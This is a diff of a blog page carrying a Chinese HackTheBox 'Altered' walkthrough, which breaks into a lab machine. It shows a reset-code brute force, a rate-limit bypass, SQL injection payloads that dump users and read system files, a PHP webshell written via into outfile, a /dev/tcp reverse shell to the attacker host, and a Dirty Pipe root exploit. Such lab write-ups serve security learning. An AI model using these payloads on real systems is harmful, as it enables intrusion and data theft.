@@ -6,12 +6,12 @@
   <meta name="keywords" content=" HackTheBox ">
   <meta name="description" content="HackTheBox-Altered | colind0pe&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#x33;&amp;#55;&amp;#48;&amp;#x32;&amp;#x32;&amp;#x37;&amp;#x39;&amp;#57;&amp;#x36;&amp;#64;&amp;#x71;&amp;#113;&amp;#46;&amp;#99;&amp;#111;&amp;#109;">
+<meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#x33;&amp;#x37;&amp;#48;&amp;#50;&amp;#50;&amp;#55;&amp;#x39;&amp;#57;&amp;#x36;&amp;#64;&amp;#x71;&amp;#x71;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109;">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于">
 <meta property="og:url" content="http://example.com/about/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#x33;&amp;#55;&amp;#48;&amp;#x32;&amp;#x32;&amp;#x37;&amp;#x39;&amp;#57;&amp;#x36;&amp;#64;&amp;#x71;&amp;#113;&amp;#46;&amp;#99;&amp;#111;&amp;#109;">
+<meta property="og:description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#49;&amp;#x33;&amp;#x37;&amp;#48;&amp;#50;&amp;#50;&amp;#55;&amp;#x39;&amp;#57;&amp;#x36;&amp;#64;&amp;#x71;&amp;#x71;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-12-25T12:19:50.097Z">
 <meta property="article:modified_time" content="2021-12-25T12:19:50.097Z">
@@ -393,7 +393,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2022-04-08 09:12:07'>2022-04-08 09:09</time>
+            发布时间 : <time class="date" title='最后更新: 2022-04-08 09:17:45'>2022-04-08 09:09</time>
         
     </div>
     <div class="article-meta">
@@ -444,63 +444,63 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png" alt="image-20220406221257614"></p>
+        <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://s2.loli.net/2022/04/06/zCJOv6DIMmx9A3H.png"></p>
 <h2 id="寻找立足点"><a href="#寻找立足点" class="headerlink" title="寻找立足点"></a>寻找立足点</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>先对靶机进行端口扫描，发现只开放了22和80端口</p>
 <pre><code>nmap -sS -sCV -T4 10.10.11.159 -o ports.nmap
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png" alt="image-20220406221900261"></p>
+<p><img src="https://s2.loli.net/2022/04/06/xOV6oa79yInJ8sz.png"></p>
 <h3 id="登陆界面攻击面测试"><a href="#登陆界面攻击面测试" class="headerlink" title="登陆界面攻击面测试"></a>登陆界面攻击面测试</h3><p>访问80端口，是一个登录界面，先尝试登录</p>
-<p><img src="https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png" alt="image-20220406222112978"></p>
+<p><img src="https://s2.loli.net/2022/04/06/AxBwegVLtURSQK4.png"></p>
 <p>发现当输入账号为<code>test</code>时返回用<code>无效用户名</code>，当输入用户名为<code>admin</code>时返回<code>密码无效</code>，存在用户名枚举</p>
-<p><img src="https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png" alt="image-20220406222457861"></p>
-<p><img src="https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png" alt="image-20220406222601374"></p>
+<p><img src="https://s2.loli.net/2022/04/06/8hD4NMympbxWoJC.png"></p>
+<p><img src="https://s2.loli.net/2022/04/06/Af4d8KuVGgWlUjQ.png"></p>
 <p>还有一个<code>忘记密码</code>的功能，试试能不能修改<code>admin</code>的密码，发现需要填写验证码。</p>
 <p>接下来有两种思路，爆破密码和爆破验证码，但是密码的位数和强度都是未知的，而验证码只有四位，并且看这个提示，应该是四位的纯数字，这样的话爆破难度还是比较低的，所以我选择爆破验证码。</p>
-<p><img src="https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png" alt="image-20220406222834364"></p>
+<p><img src="https://s2.loli.net/2022/04/06/rJcPFKaNYfMEtpO.png"></p>
 <h3 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h3><p>接下来尝试抓包对验证码进行爆破</p>
-<p><img src="https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png" alt="image-20220406223051623"></p>
+<p><img src="https://s2.loli.net/2022/04/06/16DFxnKtvHB82Tw.png"></p>
 <p>标记要爆破的参数</p>
-<p><img src="https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png" alt="image-20220406223542167"></p>
+<p><img src="https://s2.loli.net/2022/04/06/5sAge31tYRUXavB.png"></p>
 <p>设置payload</p>
-<p><img src="https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png" alt="image-20220406223615010"></p>
+<p><img src="https://s2.loli.net/2022/04/06/ShmXdWYsbBItiLu.png"></p>
 <p>爆破了一会后，状态码就从<code>200</code>变成了<code>429</code>，应该是出现错误了</p>
-<p><img src="https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png" alt="image-20220406224507714"></p>
+<p><img src="https://s2.loli.net/2022/04/06/TDmEo8Gj3Z5KOia.png"></p>
 <p>提示了错误信息，可能是爆破请求频繁导致被禁止访问了</p>
-<p><img src="https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png" alt="image-20220406225456058"></p>
-<p><img src="https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png" alt="image-20220406224541865"></p>
+<p><img src="https://s2.loli.net/2022/04/06/CQr8WHpBP2OfXVl.png"></p>
+<p><img src="https://s2.loli.net/2022/04/06/6tmigz1IkT5ZSc7.png"></p>
 <h3 id="请求次数限制绕过"><a href="#请求次数限制绕过" class="headerlink" title="请求次数限制绕过"></a>请求次数限制绕过</h3><p>按照<a target="_blank" rel="noopener" href="https://www.securecyberfuture.com/post/bypass-rate-limit">Bypass Rate Limit</a>的方法尝试绕过访问限制，添加<code>X-Forwarded-For</code>字段，返回状态码<code>200</code></p>
-<p><img src="https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png" alt="image-20220406225538569"></p>
+<p><img src="https://s2.loli.net/2022/04/06/vsTiU29mBZuf78e.png"></p>
 <p>再次进行爆破，这次要标记两个值，一个是IP地址，一个是验证码，设置好后开始爆破</p>
-<p><img src="https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png" alt="image-20220407082830901"></p>
-<p><img src="https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png" alt="image-20220407082849862"></p>
-<p><img src="https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png" alt="image-20220407082902486"></p>
+<p><img src="https://s2.loli.net/2022/04/07/fnCuAOzq4LPxYFX.png"></p>
+<p><img src="https://s2.loli.net/2022/04/07/bHDNmKfyr9luto8.png"></p>
+<p><img src="https://s2.loli.net/2022/04/07/o1JzvOMdp8ebmgN.png"></p>
 <p>等待了几分钟后，成功爆破出了验证码</p>
-<p><img src="https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png" alt="image-20220407082748043"></p>
+<p><img src="https://s2.loli.net/2022/04/07/lKakyxL9cw3ZRWs.png"></p>
 <p>使用验证码修改了<code>admin</code>的密码后登录，跳转到了用户列表</p>
-<p><img src="https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png" alt="image-20220407083020805"></p>
+<p><img src="https://s2.loli.net/2022/04/07/38MBik7CpZmQyxg.png"></p>
 <p>点击用户栏的<code>View</code>会在上方显示出用户的信息</p>
-<p><img src="https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png" alt="image-20220407083205959"></p>
+<p><img src="https://s2.loli.net/2022/04/07/3bslipU7V8yFWCg.png"></p>
 <h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h3><p>抓包查看一下</p>
-<p><img src="https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png" alt="image-20220407110127314"></p>
+<p><img src="https://s2.loli.net/2022/04/08/wis5IJXNadpbqKO.png"></p>
 <p>将请求方式更改为POST，看一下会返回什么。提示不支持POST</p>
-<p><img src="https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png" alt="image-20220407110212251"></p>
+<p><img src="https://s2.loli.net/2022/04/07/fmPeu5sCd2KVJko.png"></p>
 <p>然后试试用POST的请求方式，但将POST改为GET。返回了一些<code>JSON</code>格式的信息</p>
-<p><img src="https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png" alt="image-20220407110242224"></p>
+<p><img src="https://s2.loli.net/2022/04/08/osU2tT1lKNLfinp.png"></p>
 <p>那我们也将请求内容改为<code>JSON</code>格式试试。如下，返回正常了</p>
-<p><img src="https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png" alt="image-20220407110625439"></p>
+<p><img src="https://s2.loli.net/2022/04/07/Z9k7H43nifCKPFE.png"></p>
 <p>上面的<code>cookie</code>可以看到有<code>laravel_session</code>的字段，这个站点是使用的<code>Laravel</code>框架，而<code>Laravel</code>是一款<code>PHP</code>Web开发框架</p>
 <p>参考文章<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/323834.html">PHP弱类型</a>，将<code>secret</code>的值改为<code>bool</code>类型的<code>true</code>，任意的<code>id</code>的值都能返回正常</p>
-<p><img src="https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png" alt="image-20220407110718304"></p>
-<p><img src="https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png" alt="image-20220407110855658"></p>
+<p><img src="https://s2.loli.net/2022/04/07/PvloBYVWMgGhixk.png"></p>
+<p><img src="https://s2.loli.net/2022/04/07/7WPRVgbFexktGqc.png"></p>
 <h3 id="SQL注入测试"><a href="#SQL注入测试" class="headerlink" title="SQL注入测试"></a>SQL注入测试</h3><p>接着对<code>id</code>进行测试，发现添加一个<code>单引号</code>，返回<code>服务器错误</code>，很明显的<code>SQL注入</code>的特征</p>
-<p><img src="https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png" alt="image-20220407111106054"></p>
+<p><img src="https://s2.loli.net/2022/04/07/Waf4CUv9jr3BiLH.png"></p>
 <p>接下来试<code>SQL注入</code>，先通过<code>order by</code>判断字段数，当为<code>3</code>时返回正常，<code>4</code>时返回错误，因此字段数为<code>3</code></p>
-<p><img src="https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png" alt="image-20220407111229662"></p>
-<p><img src="https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png" alt="image-20220407111243856"></p>
+<p><img src="https://s2.loli.net/2022/04/07/YuOMwn6XZTiK7sj.png"></p>
+<p><img src="https://s2.loli.net/2022/04/07/ydubUGQXFn34a9q.png"></p>
 <p>接下来通过<code>union select</code>查看回显的位置</p>
-<p><img src="https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png" alt="image-20220407111326443"></p>
+<p><img src="https://s2.loli.net/2022/04/07/4FrBCcIWmvjhlSp.png"></p>
 <p>将<code>3</code>的位置替换为SQL语句可以成功执行</p>
-<p><img src="https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png" alt="image-20220407111348910"></p>
+<p><img src="https://s2.loli.net/2022/04/07/XiWQEdZCqhUVAn3.png"></p>
 <p>先爆出所有数据库名</p>
 <pre><code class="mysql">-2 union select 1,2,group_concat(schema_name) from information_schema.schemata-- -
 </code></pre>
@@ -508,32 +508,32 @@
 <p>爆出所有表名和列名</p>
 <pre><code class="mysql">-2 union select 1,2,group_concat(&#39;\n&#39;,table_name,&#39;:&#39;,column_name) from information_schema.columns where table_schema=&#39;uhc&#39;-- -
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png" alt="image-20220407112133588"></p>
+<p><img src="https://s2.loli.net/2022/04/07/rScqosgbE3eU1vu.png"></p>
 <p>爆出<code>users</code>表的内容</p>
 <pre><code class="sql">-2 union select 1,2,group_concat(&#39;\n&#39;,name,&#39;:&#39;,password) from uhc.users-- -
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png" alt="image-20220407112322465"></p>
+<p><img src="https://s2.loli.net/2022/04/07/JUXfkdngHwLiuIT.png"></p>
 <p>但是我们已经有<code>admin</code>的密码了，所以这些内容对我们没有什么帮助。接下来看看注入点能不能读取文件，如下图，成功读到了<code>/etc/passwd</code>文件</p>
 <pre><code class="mysql">-2 union select 1,2,load_file(&#39;/etc/passwd&#39;)-- -
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png" alt="image-20220407112451809"></p>
+<p><img src="https://s2.loli.net/2022/04/07/2p6nuryEGcMdgto.png"></p>
 <p>接下来的思路是通过<code>SQL注入</code>往站点写<code>shell</code>，来获得服务器权限，但是先要知道站点的真实路径</p>
 <h3 id="SQL注入写shell"><a href="#SQL注入写shell" class="headerlink" title="SQL注入写shell"></a>SQL注入写shell</h3><p>在最开始的端口扫描中可以看到，该站点使用了<code>Nginx</code>作为中间件，我们可以读取<code>Nginx</code>的站点配置文件，来查看配置的站点根目录。尝试读取<code>Nginx</code>的站点配置文件的默认路径</p>
 <pre><code class="sql">-2 union select 1,2,load_file(&#39;/etc/nginx/sites-enabled/default&#39;)-- -
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png" alt="image-20220407113033230"></p>
+<p><img src="https://s2.loli.net/2022/04/07/OmrVS3ct9DYBngK.png"></p>
 <p>如上图，在该配置文件中存在网站根目录的路径，之后我们就可以往这个路径写<code>shell</code>，来得到服务器的初步控制权</p>
 <p>通过<code>into outfile</code>向网站根目录写入<code>0.php</code>，返回<code>服务器错误</code>，但是不影响</p>
 <pre><code class="sql">-2 union select 1,2,&#39;&lt;?=`$_GET[1]`?&gt;&#39; into outfile&#39;/srv/altered/public/0.php&#39;-- -
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png" alt="image-20220407114434102"></p>
+<p><img src="https://s2.loli.net/2022/04/07/uj84zPFgpCSkvtB.png"></p>
 <p>访问我们的<code>shell</code>，能成功执行系统命令</p>
-<p><img src="https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png" alt="image-20220407114451243"></p>
+<p><img src="https://s2.loli.net/2022/04/07/gcQ12z8SUTPbjMO.png"></p>
 <h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>通过我们写入的<code>webshell</code>，反弹一个<code>shell</code>回来，翻遍后续的操作</p>
 <pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.16.6/4444 0&gt;&amp;1&#39;
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png" alt="image-20220407114531995"></p>
-<p><img src="https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png" alt="image-20220407114710865"></p>
+<p><img src="https://s2.loli.net/2022/04/07/9lCLgJHN4wdBRPG.png"></p>
+<p><img src="https://s2.loli.net/2022/04/07/PWawh73XpYFUqfx.png"></p>
 <p>本地开启的监听接收到了反弹<code>shell</code></p>
 <p>通过以下命令，将反弹回来的<code>shell</code>升级为完全交互式的<code>shell</code></p>
 <pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
@@ -542,18 +542,18 @@ stty raw -echo; fg
 reset
 xterm
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png" alt="image-20220407114925922"></p>
+<p><img src="https://s2.loli.net/2022/04/07/G2CRUcO61Xfne8H.png"></p>
 <h3 id="Dirty-Pipe提权漏洞"><a href="#Dirty-Pipe提权漏洞" class="headerlink" title="Dirty Pipe提权漏洞"></a>Dirty Pipe提权漏洞</h3><p>查看系统的版本为<code>5.16</code></p>
-<p><img src="https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png" alt="image-20220407115101335"></p>
+<p><img src="https://s2.loli.net/2022/04/07/nSyjNIEC5bMgvJP.png"></p>
 <p>前段时间刚爆出了一个Linux的提权漏洞<code>Dirty Pipe</code>，看了一下<a target="_blank" rel="noopener" href="https://dirtypipe.cm4all.com/#the-dirty-pipe-vulnerability">The Dirty Pipe Vulnerability</a>的影响范围：</p>
 <ul>
 <li>version &gt; 5.8</li>
 <li>version &lt; 5.16.11、5.15.25、5.10.102</li>
 </ul>
-<p><img src="https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png" alt="image-20220407115224611"></p>
+<p><img src="https://s2.loli.net/2022/04/07/qmCM3tDyNL9c4Zz.png"></p>
 <p>这台靶机服务器的版本在影响范围内，所以我们可以直接下载<code>exploit</code>并编译，上传到靶机中执行，来获得<code>root</code>权限</p>
 <p>现在攻击机下载<a target="_blank" rel="noopener" href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">DirtyPipe-Exploits</a>，并编译。因为攻击机和靶机的Linux版本不一样，所以使用<code>-fPIC -static</code>参数进行编译，防止因编译环境不一致导致<code>exploit</code>运行出现问题</p>
-<p><img src="https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png" alt="image-20220407115650703"></p>
+<p><img src="https://s2.loli.net/2022/04/07/RKEBUfc4ZJp7PdL.png"></p>
 <pre><code>wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
 
 gcc exploit-2.c -o exp -fPIC -static 
@@ -561,15 +561,15 @@ gcc exploit-2.c -o exp -fPIC -static
 <p>在攻击机用<code>python</code>起一个简易的服务器</p>
 <pre><code>python3 -m http.server 80
 </code></pre>
-<p><img src="https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png" alt="image-20220407115741630"></p>
+<p><img src="https://s2.loli.net/2022/04/07/FNzIDskuW1m32Sx.png"></p>
 <p>在靶机下载，并赋予执行权限</p>
 <pre><code>wget 10.10.16.6/exp
 
 chmod +x ./exp
 </code></pre>
 <p>按照<code>exploit</code>作者的使用方法，执行<code>exploit</code>劫持<code>SUID</code>成功提升至<code>root</code>权限</p>
-<p><img src="https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png" alt="image-20220407115909744"></p>
-<p><img src="https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png" alt="image-20220407120119543"></p>
+<p><img src="https://s2.loli.net/2022/04/07/O6DUQZmzcsqxdTw.png"></p>
+<p><img src="https://s2.loli.net/2022/04/07/4JXxQYszoTRrjAB.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1370227996@qq.com </span>
